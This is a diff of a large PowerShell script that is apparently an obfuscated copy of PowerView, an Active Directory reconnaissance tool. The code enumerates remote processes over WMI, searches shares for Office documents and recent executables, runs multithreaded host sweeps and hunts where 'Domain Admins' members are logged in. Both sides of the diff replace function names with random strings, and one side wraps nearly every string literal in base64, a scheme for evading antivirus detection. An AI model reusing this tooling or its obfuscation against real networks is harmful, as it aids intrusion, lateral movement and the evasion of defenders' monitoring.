 }
 
 
-function hypass {
+function txpefw {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -9761,7 +9765,7 @@ function hypass {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),
+        $ComputerName = 'localhost',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -9772,31 +9776,31 @@ function hypass {
         ForEach ($Computer in $ComputerName) {
             try {
                 $WmiArguments = @{
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) = $ComputerName
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3M="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luMzJfcHJvY2Vzcw==")))
+                    'ComputerName' = $ComputerName
+                    'Class' = 'Win32_process'
                 }
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $WmiArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
                 Get-WMIobject @WmiArguments | ForEach-Object {
                     $Owner = $_.getowner();
                     $Process = New-Object PSObject
-                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc05hbWU="))) $_.ProcessName
-                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc0lE"))) $_.ProcessID
-                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) $Owner.Domain
-                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg=="))) $Owner.User
-                    $Process.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlVzZXJQcm9jZXNz"))))
+                    $Process | Add-Member Noteproperty 'ComputerName' $Computer
+                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
+                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
+                    $Process | Add-Member Noteproperty 'Domain' $Owner.Domain
+                    $Process | Add-Member Noteproperty 'User' $Owner.User
+                    $Process.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                     $Process
                 }
             }
             catch {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlQcm9jZXNzXSBFcnJvciBlbnVtZXJhdGluZyByZW1vdGUgcHJvY2Vzc2VzIG9uICckQ29tcHV0ZXInLCBhY2Nlc3MgbGlrZWx5IGRlbmllZDogezB9"))) -f $_)
+                Write-Verbose ("[Get-WMIProcess] Error enumerating remote processes on '$Computer', access likely denied: {0}" -f $_)
             }
         }
     }
 }
 
 
-function feyvym {
+function gjmfdn {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -9806,7 +9810,7 @@ function feyvym {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $Path = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Llw="))),
+        $Path = '.\',
 
         [Parameter(ParameterSetName = 'FileSpecification')]
         [ValidateNotNullOrEmpty()]
@@ -9856,22 +9860,22 @@ function feyvym {
     BEGIN {
         $SearcherArguments =  @{
             'Recurse' = $True
-            'ErrorAction' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2lsZW50bHlDb250aW51ZQ==")))
+            'ErrorAction' = 'SilentlyContinue'
             'Include' = $Include
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2ZmaWNlRG9jcw==")))]) {
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5jbHVkZQ==")))] = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5kb2M="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5kb2N4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki54bHM="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki54bHN4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5wcHQ="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5wcHR4"))))
+        if ($PSBoundParameters['OfficeDocs']) {
+            $SearcherArguments['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
         }
-        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RnJlc2hFWEVz")))]) {
+        elseif ($PSBoundParameters['FreshEXEs']) {
             
-            $LastAccessTime = (Get-Date).AddDays(-7).ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TU0vZGQveXl5eQ=="))))
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5jbHVkZQ==")))] = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5leGU="))))
+            $LastAccessTime = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
+            $SearcherArguments['Include'] = @('*.exe')
         }
-        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yY2U=")))] = -not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZUhpZGRlbg==")))]
+        $SearcherArguments['Force'] = -not $PSBoundParameters['ExcludeHidden']
 
         $MappedComputers = @{}
 
-        function cvvwcx {
+        function stkofu {
             
             [CmdletBinding()]Param([String]$Path)
             try {
@@ -9887,46 +9891,46 @@ function feyvym {
 
     PROCESS {
         ForEach ($TargetPath in $Path) {
-            if (($TargetPath -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFxcXC4qXFwuKg==")))) -and ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))])) {
+            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                 $HostComputer = (New-Object System.Uri($TargetPath)).Host
                 if (-not $MappedComputers[$HostComputer]) {
                     
-                    jymmbe -ComputerName $HostComputer -Credential $Credential
+                    ehlhmp -ComputerName $HostComputer -Credential $Credential
                     $MappedComputers[$HostComputer] = $True
                 }
             }
 
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA==")))] = $TargetPath
+            $SearcherArguments['Path'] = $TargetPath
             Get-ChildItem @SearcherArguments | ForEach-Object {
                 
                 $Continue = $True
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZUZvbGRlcnM=")))] -and ($_.PSIsContainer)) {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkaW5nOiB7MH0="))) -f $($_.FullName))
+                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
+                    Write-Verbose ("Excluding: {0}" -f $($_.FullName))
                     $Continue = $False
                 }
                 if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                     $Continue = $False
                 }
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdFdyaXRlVGltZQ==")))] -and ($_.LastWriteTime -lt $LastWriteTime)) {
+                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                     $Continue = $False
                 }
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRpb25UaW1l")))] -and ($_.CreationTime -lt $CreationTime)) {
+                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $CreationTime)) {
                     $Continue = $False
                 }
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tXcml0ZUFjY2Vzcw==")))] -and (-not (cvvwcx -Path $_.FullName))) {
+                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (stkofu -Path $_.FullName))) {
                     $Continue = $False
                 }
                 if ($Continue) {
                     $FileParams = @{
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA=="))) = $_.FullName
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3duZXI="))) = $((Get-Acl $_.FullName).Owner)
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdEFjY2Vzc1RpbWU="))) = $_.LastAccessTime
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdFdyaXRlVGltZQ=="))) = $_.LastWriteTime
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRpb25UaW1l"))) = $_.CreationTime
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGVuZ3Ro"))) = $_.Length
+                        'Path' = $_.FullName
+                        'Owner' = $((Get-Acl $_.FullName).Owner)
+                        'LastAccessTime' = $_.LastAccessTime
+                        'LastWriteTime' = $_.LastWriteTime
+                        'CreationTime' = $_.CreationTime
+                        'Length' = $_.Length
                     }
                     $FoundFile = New-Object -TypeName PSObject -Property $FileParams
-                    $FoundFile.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkZvdW5kRmlsZQ=="))))
+                    $FoundFile.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                     $FoundFile
                 }
             }
@@ -9935,7 +9939,7 @@ function feyvym {
 
     END {
         
-        $MappedComputers.Keys | erbqbk
+        $MappedComputers.Keys | oqraoh
     }
 }
 
@@ -9946,7 +9950,7 @@ function feyvym {
 
 
 
-function payhcg {
+function umwnhz {
     
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [CmdletBinding()]
@@ -9987,7 +9991,7 @@ function payhcg {
             $MyVars = Get-Variable -Scope 2
 
             
-            $VorbiddenVars = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Pw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YXJncw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29uc29sZUZpbGVOYW1l"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3I="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhlY3V0aW9uQ29udGV4dA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZmFsc2U="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SE9NRQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SG9zdA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aW5wdXQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5wdXRPYmplY3Q="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUFsaWFzQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bURyaXZlQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUVycm9yQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUZ1bmN0aW9uQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUhpc3RvcnlDb3VudA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bVZhcmlhYmxlQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TXlJbnZvY2F0aW9u"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnVsbA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UElE"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNCb3VuZFBhcmFtZXRlcnM="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNDb21tYW5kUGF0aA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNDdWx0dXJl"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNEZWZhdWx0UGFyYW1ldGVyVmFsdWVz"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNIT01F"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNTY3JpcHRSb290"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNVSUN1bHR1cmU="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNWZXJzaW9uVGFibGU="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFdE"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2hlbGxJZA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3luY2hyb25pemVkSGFzaA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dHJ1ZQ=="))))
+            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
 
             
             ForEach ($Var in $MyVars) {
@@ -10012,9 +10016,9 @@ function payhcg {
 
         
         $Method = $Null
-        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QmVnaW5JbnZva2U="))) }) {
+        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
             $MethodParameters = $M.GetParameters()
-            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aW5wdXQ="))) -and $MethodParameters[1].Name -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b3V0cHV0")))) {
+            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
                 $Method = $M.MakeGenericMethod([Object], [Object])
                 break
             }
@@ -10022,7 +10026,7 @@ function payhcg {
 
         $Jobs = @()
         $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}
-        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6IHswfQ=="))) -f $($ComputerName.count))
+        Write-Verbose ("[New-ThreadedFunction] Total number of hosts: {0}" -f $($ComputerName.count))
 
         
         if ($Threads -ge $ComputerName.Length) {
@@ -10044,7 +10048,7 @@ function payhcg {
             $ComputerNamePartitioned += @(,@($List.ToArray()))
         }
 
-        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBUb3RhbCBudW1iZXIgb2YgdGhyZWFkcy9wYXJ0aXRpb25zOiAkVGhyZWFkcw==")))
+        Write-Verbose "[New-ThreadedFunction] Total number of threads/partitions: $Threads"
 
         ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
             
@@ -10052,7 +10056,7 @@ function payhcg {
             $PowerShell.runspacepool = $Pool
 
             
-            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))), $ComputerNamePartition)
+            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter('ComputerName', $ComputerNamePartition)
             if ($ScriptParameters) {
                 ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                     $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
@@ -10072,7 +10076,7 @@ function payhcg {
     }
 
     END {
-        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBUaHJlYWRzIGV4ZWN1dGluZw==")))
+        Write-Verbose "[New-ThreadedFunction] Threads executing"
 
         
         Do {
@@ -10084,7 +10088,7 @@ function payhcg {
         While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
 
         $SleepSeconds = 100
-        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBXYWl0aW5nICRTbGVlcFNlY29uZHMgc2Vjb25kcyBmb3IgZmluYWwgY2xlYW51cC4uLg==")))
+        Write-Verbose "[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup..."
 
         
         for ($i=0; $i -lt $SleepSeconds; $i++) {
@@ -10096,12 +10100,12 @@ function payhcg {
         }
 
         $Pool.Dispose()
-        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBhbGwgdGhyZWFkcyBjb21wbGV0ZWQ=")))
+        Write-Verbose "[New-ThreadedFunction] all threads completed"
     }
 }
 
 
-function hoszyu {
+function zlvkct {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -10169,7 +10173,7 @@ function hoszyu {
         [ValidateNotNullOrEmpty()]
         [Alias('GroupName', 'Group')]
         [String[]]
-        $UserGroupIdentity = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIEFkbWlucw=="))),
+        $UserGroupIdentity = 'Domain Admins',
 
         [Alias('AdminCount')]
         [Switch]
@@ -10189,7 +10193,7 @@ function hoszyu {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -10226,7 +10230,7 @@ function hoszyu {
 
         [String]
         [ValidateSet('DFS', 'DC', 'File', 'All')]
-        $StealthSource = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs"))),
+        $StealthSource = 'All',
 
         [Int]
         [ValidateRange(1, 100)]
@@ -10236,99 +10240,99 @@ function hoszyu {
     BEGIN {
 
         $ComputerSearcherArguments = @{
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))
+            'Properties' = 'dnshostname'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJMREFQRmlsdGVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $ComputerLDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))] = $Unconstrained }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))] = $OperatingSystem }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZXJ2aWNlUGFjaw==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))] = $ServicePack }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTaXRlTmFtZQ==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))] = $SiteName }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
 
         $UserSearcherArguments = @{
-            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU=")))
+            'Properties' = 'samaccountname'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $UserIdentity }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckxEQVBGaWx0ZXI=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $UserLDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNlYXJjaEJhc2U=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $UserSearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFkbWluQ291bnQ=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5Db3VudA==")))] = $UserAdminCount }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckFsbG93RGVsZWdhdGlvbg==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3dEZWxlZ2F0aW9u")))] = $UserAllowDelegation }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
+        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
